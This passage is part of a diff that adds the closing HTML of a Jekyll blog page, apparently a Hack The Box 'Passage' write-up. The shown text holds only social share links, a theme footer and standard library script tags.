+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Passage - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Passage" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
